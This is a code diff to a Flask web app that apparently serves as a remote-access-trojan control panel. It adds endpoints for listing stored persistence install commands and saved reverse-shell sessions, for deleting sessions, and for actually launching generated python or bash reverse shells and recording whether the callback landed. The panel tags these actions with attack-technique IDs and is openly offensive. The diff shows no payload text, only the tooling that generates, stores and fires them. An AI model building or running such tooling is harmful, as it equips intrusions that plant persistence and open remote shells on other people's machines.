@@ -23,8 +23,12 @@ def api_rat_recon():
     db.save_rat_operation('recon', 'System Reconnaissance', platform.system().lower(), {}, result, 'low')
     return jsonify(result)
 
+@bp.route('/api/rat/persistence', methods=['GET'])
 @bp.route('/api/rat/persistence', methods=['POST'])
 def api_rat_persistence():
+    # P16: GET reads the previously write-only rat_persistence table.
+    if request.method == 'GET':
+        return jsonify({'records': db.get_rat_persistence(request.args.get('os'))})
     from rat_controller import generate_persistence
     data = request.get_json(force=True)
     os_type = data.get('os_type', 'windows')
@@ -34,10 +38,24 @@ def api_rat_persistence():
     result = generate_persistence(os_type, method, payload_cmd, callback_url)
     track_event('rat_persistence')
     db.save_rat_operation('persistence', f'Persistence ({os_type})', os_type, data, result, 'high', 'T1547')
+    # P16: rat_persistence was a dead table -- created, indexed, helper written,
+    # never inserted.  Persist one row per generated method.
+    for key, m in (result.get('methods') or {}).items():
+        try:
+            db.save_rat_persistence(os_type, m.get('name', key), m.get('install_cmd', ''),
+                                    m.get('cleanup_cmd', ''), m.get('risk_level', ''),
+                                    m.get('survival', ''))
+        except Exception:
+            pass
     return jsonify(result)
 
+@bp.route('/api/rat/shells', methods=['GET'])
 @bp.route('/api/rat/shells', methods=['POST'])
 def api_rat_shells():
+    # P16: GET lists the saved shell sessions.  The table was written on every
+    # POST but had no reader anywhere (get_rat_shells() was never called).
+    if request.method == 'GET':
+        return jsonify({'sessions': db.get_rat_shells()})
     from rat_controller import generate_reverse_shell
     data = request.get_json(force=True)
     shell_type = data.get('shell_type', 'all')
@@ -50,6 +68,49 @@ def api_rat_shells():
     # Also save to shell sessions
     db.save_rat_shell(f'Shell-{shell_type}', shell_type, lhost, lport, '', json.dumps(result.get('shells', {})), encoding)
     return jsonify(result)
+
+
+@bp.route('/api/rat/shells/<int:shell_id>', methods=['DELETE'])
+def api_rat_shell_delete(shell_id):
+    db.delete_rat_shell(shell_id)
+    return jsonify({'status': 'deleted'})
+
+
+@bp.route('/api/rat/launch', methods=['POST'])
+def api_rat_launch():
+    """P16: actually RUN a generated shell against a local listener.
+
+    The rest of this blueprint only emits strings.  This composes the P14
+    organs (adapter -> runner -> listener/verify) so the callback is
+    *observed*, not promised.  Local-only: the listener binds on the host
+    running Flask, so it proves the one-liner works, not that a remote
+    victim ran it.
+    """
+    from app.exec.strike import launch_payload
+    data = request.get_json(force=True) or {}
+    payload_type = data.get('payload_type', 'python_reverse')
+    if payload_type not in ('python_reverse', 'bash_reverse'):
+        return jsonify({'error': 'payload_type must be python_reverse or bash_reverse'}), 400
+    lhost = data.get('lhost') or '127.0.0.1'
+    try:
+        strike = launch_payload(payload_type, lhost, int(data.get('lport', 0) or 0),
+                                timeout=float(data.get('timeout', 4.0)))
+    except Exception as exc:
+        return jsonify({'ok': False, 'error': str(exc)}), 500
+
+    track_event('rat_launch')
+    db.save_rat_operation('launch', f'Launch ({payload_type})', 'cross', data,
+                          {'summary': strike.summary(), 'ok': strike.ok},
+                          'critical', 'T1059')
+    db.save_rat_shell(f'Launched-{payload_type}', payload_type, lhost,
+                      str(data.get('lport', 0)), strike.target, '', 'none')
+    return jsonify({
+        'ok': strike.ok,
+        'summary': strike.summary(),
+        'target': strike.target,
+        'callback_ok': strike.callback.ok,
+        'exec': strike.exec.as_dict(),
+    })
 
 @bp.route('/api/rat/credentials/targets', methods=['GET'])
 def api_rat_cred_targets():
